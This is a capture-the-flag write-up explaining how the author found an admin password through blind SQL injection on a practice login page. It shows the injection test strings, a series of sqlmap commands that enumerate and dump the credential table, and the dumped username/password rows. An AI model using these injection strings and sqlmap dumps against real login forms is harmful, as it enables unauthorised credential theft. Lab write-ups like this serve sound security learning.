    <h3> KITS CTF 4 SECFEST</h3>
    <h2> Challenge 2</h2>
    <p> Like challenge 1, the goal of this challenge is to find the admin password for the login page.</p>
    <p> Inspecting the form we see that authentication is not performed clientside in contrast to challenge 1,
        instead sending username and password to a php program <code>login.php</code>, which then communicates back via http status code. 
     </p>

    <p>
        A hint on the page tells us to try "guest" "guest" as a login, which grants us access to the guest account.
        Whats strange is that the login seems to be case-insensitive with logins "gUeSt" and "GuEsT" both still resulting in successful authentication.
        Also, adding "\" into the username and password seems to not affect the result (example "gue\st").
    </p>

    <p> 
        Something is strange with <code>login.php</code>, so lets try sql injection.
        After testing some usual strings, I found this:
    </p>

    <code>username: admin' or '1' = '1 ; passowrd: guest</code> resulted in a succsesfull login as guest while
    <br>
    <code>username: admin' or '1' = '0 ; passowrd: guest</code> resulted in an unsuccessfull login.

    <p> The good news is that we have found an sql-injection vulnerability!
        The bad news is that since the server only responds in http status codes we can only get yes/no results from our queries.
        The solution is <a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">blind sql injection</a> where we
        can extract information via a series of true or false questions.
    </p>

    <p>Doing this by hand is something I would like to avoid, so since the ctf allows for automated tools I will use <code>sqlmap</code> to find the password.</p>

    <p>After creating a http request file for sqlmap to detect the multipart form which contains the vulnerability, I ran the following command:</p>
    <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200 --dump</code>
    <p>The important parts:</p>
    <ul>
        <li><code>--delay=0.1</code> throttles requests made by sqlmap to 10 every second (While the ctf rules did not say anything about how many requests we were allowed to perform per second, I wanted to be polite)</li>
        <li><code>-p username</code> the data field that contains the sql injection vulnerability</li>
        <li><code>--ignore-code=403 --code 200</code> tell sqlmap to ignore http error codes, and treat http code 200 as the sql query evaluating to true </li>
        <li><code>--dump</code> give us info about the sql server </li>
    </ul>

    <p>sqlmap found our injection easily, reporting it as <code>AND boolean-based blind - WHERE or HAVING clause</code></p>
    <p> It also reported that the sql server is a MariaDB server version 5</p>
    
    <p>
        Reruning with the <code>--dbs</code> and <code>--tables</code> options we find that there exists a database by name "ctf" and a table called "kitsctf2".
        For some reason sqlmap had a difficult time finding the column names of the table, but guessing that they are the same as the field names, "username","password", we can get all rows via:<br>
        <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200 -D ctf -T kitsctf2 -C username,password --dump</code><br>
        I let it run for a while, and came back to this:
        <pre>
+-----------------+----------+
| username        | password |
+-----------------+----------+
| tinywolf833     | 1011     |
| brownkoala841   | 102030   |
| whitegorilla800 | 1112     |
| goldentiger612  | 1200     |
| lazylion642     | 12345678 |
+-----------------+----------+
        </pre>
        Testing these logins resulted in a succsefull login as that user, but each row takes a while to gather and since time was running out i needed a faster way to find the admin key.
    </p>
    <p>
        Replacing <code>--dump</code> with <code>--count</code> we see that there are 202 rows in the table
        This would take a long time to dump, but since we know that the password has to start with a capital K (from the flag format), we only need to check the first letter of every row!!
        Once we have found a row with a password starting with "K" we can then extract the entire password.
    </p>
    This was done with the command:
    <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200 --dbms=mysql -D ctf -T kitsctf2 -C password --first 1 --last 1 --dump</code>
    The output is saved in a text file, which we can then use <code>grep -n K</code> to get the row number which was 105.

    then we use a slightly modified sqlmap command to get the loggin info:

    <code>sqlmap --delay=0.1 -r /home/j/request.txt -p username --ignore-code=403 --code=200  --fresh-queries --dbms=mysql -D ctf -T kitsctf2 -C username,password --start 104 --stop 106 --dump</code>

    <p>Here we extract row 104-106, to account for any errors when finding the row. Note the <code>--fresh-queries</code> which was needed because sqlmap would present the single character results instead of the full password.</p>

    The resulting table given by sqlmap:


    <pre>
+---------------+-----------------------------+
| username      | password                    |
+---------------+-----------------------------+
| bigmouse509   | KITS{K1T5_&lt;3_5ecur1ty_f3sT} |
| blueduck186   | knockers                    |
| crazygoose390 | kojak                       |
+---------------+-----------------------------+
    </pre>

    And with that we have solved challenge 2!
